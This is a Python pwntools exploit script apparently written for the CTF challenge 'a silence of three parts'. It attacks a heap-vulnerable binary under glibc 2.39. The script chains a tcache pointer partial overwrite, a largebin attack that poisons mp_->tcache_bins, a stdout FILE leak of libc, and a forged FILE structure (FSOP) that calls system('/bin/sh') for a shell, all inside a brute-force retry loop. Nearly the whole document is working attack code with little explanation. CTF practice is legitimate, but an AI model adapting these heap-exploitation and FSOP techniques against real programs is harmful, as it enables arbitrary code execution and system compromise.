from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64

file = "./silence-of-three_patched"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    define zap
    patc q 0x5555555622d0 0x5550000377a2
    end
    define allocs
    p (char*[128])chunks
    end
    c
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("a-silence-of-three-parts.chal.idek.team", 1337)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))

def launch():
    l = launch_local
    # l = launch_remote
    with context.local(log_level=logging.ERROR):
        l()
    if l == launch_remote:
        leak = recvu(b"===================")
        pow = getb(leak, b") solve ", b"\n").decode()
        proc = subprocess.Popen(["python3", "pow.py", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        pow = proc.communicate()[0]
        sla(b"Solution? ", pow)

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

#
# exploit goes here
#
with context.local(log_level=logging.WARN):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

count = 0
tries = 0
tries_prog = log.progress("Tries")
def exploit():
    def malloc(size, data=b"\n", a=1):
        global count
        sla(b": ", b"0")
        sla(b": ", str(size).encode())
        sa(b": ", data)
        if a:
            recvu(b": ")
        count += 1
        return count - 1
    def free(index):
        sla(b": ", b"1")
        sla(b": ", str(index).encode())
    def zap(index):
        sla(b": ", b"2")
        sla(b": ", str(index).encode())

    # two tcache chunks for later partial overwrite (zap)
    step1_tcache1 = malloc(0x28, b"A"*0x10 + flat(0, (0x20 + 0x30 + 0x90 + 0x20 + 0x420) | 1)) # craft fake unsorted header, overwritten fd will point here to craft a fake unsorted
    step1_tcache2 = malloc(0x28)

    unsorted = malloc(0x88)
    malloc(0) # fence

    big_large = malloc(0x528, b"A"*0x420 + flat(0, 0x21, 0, 0, 0, 0x21))
    malloc(0x28) # fence
    small_large = malloc(0x518) # will use to trigger largebin attack

    malloc(0x28) # fence

    free(step1_tcache1)
    free(step1_tcache2) # will have fd pointing to heap (mangled)

    zap(step1_tcache2) # needs LSB of heap page number = 0xc0
    # input("zapped") # for debugging

    malloc(0x28) # update tcache entry 0x30 with overwritten fd (zap)
    fake_unsorted = malloc(0x28)

    # malloc(0x88)
    fake_count = malloc(0x48) # will use to set tcache count 0x500 (when mp_->tcache_bins will be poisoned)

    free(big_large)
    malloc(0x558) # sort unsorted bin (big_large) into largebins

    free(fake_unsorted)
    malloc(0x20 + 0x30 + 0x90 + 0x20 - 8) # malloc a bit from fake unsorted so the unsorted is near bk_nextsize
    malloc(0x418, b"A"*8 + p16(0x31e8-4*8)) # partial overwrite the remains of the fake unsorted -> new bk_nextsize of big_large

    free(small_large)
    malloc(0x558) # sort unsorted bin into largebin and trigger a largebin attack

    # input()
    tcache_fillers = [malloc(0x88) for _ in range(7)]
    for i in tcache_fillers: # fill tcache 0x90 to free "unsorted" and get a libc pointer in tcache entry 0x500
        free(i)
    # now that mp_->tcache_bins is poisoned
    free(unsorted) # set tcache entry 0x500
    free(fake_count) # set tcache count 0x500

    # malloc(0x558) # sort unsorted bin, sort "unsorted" in the small bins so when allocating it, it keeps its libc pointers (else we get a tcache safe linked ptr)
    # we can also allocate less than 0x90, it will sort it in smallbin and allocate it in one malloc()

    # do not allocate 0x88 or else we won't get a libc pointer (else we get a tcache safe-linked ptr) https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4132
    unsorted = malloc(0x78, p16(0x45c0)) # partial overwrite the remains of the unsorted so tcache entry 0x500 points to stdout

    payload = flat([
        0xfbad1800,
        0,
        0,
        0,
    ]) + b"\0"
    malloc(0x4f8, payload, False) # leak with stdout


    libc.address = u64(recvn(8)) - 0x204644
    success("libc: %#018x" % libc.address)
    if (libc.address >> 48) != 0:
        raise EOFError # bad leak, abort

    malloc(0x88) # empty tcache a bit so "unsorted" will be freed in a tcache bin
    # no need to fill tcache again and partial overwrite, now we have a libc leak
    free(unsorted) # free it and malloc again to write stdout's address and get a shell
    unsorted = malloc(0x88, p64(libc.sym["_IO_2_1_stdout_"]))

    file = FileStructure()
    file.flags = 0x3b01010101010101
    file._IO_read_ptr = b"/bin/sh\0"
    file._lock =  libc.sym["_IO_stdfile_1_lock"]
    file._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
    file.vtable = libc.address + 0x2022b0
    payload = bytes(file) + p64(libc.sym.system) + p64(0) + p64(libc.sym["_IO_2_1_stdout_"] + 0xe0 - 0x68)
    
    malloc(0x4f8, payload, False)
    success("shell")

    io.interactive()
    input("end")
    exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))
    launch()
    try:
        exploit()
    except EOFError:
        pass
    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)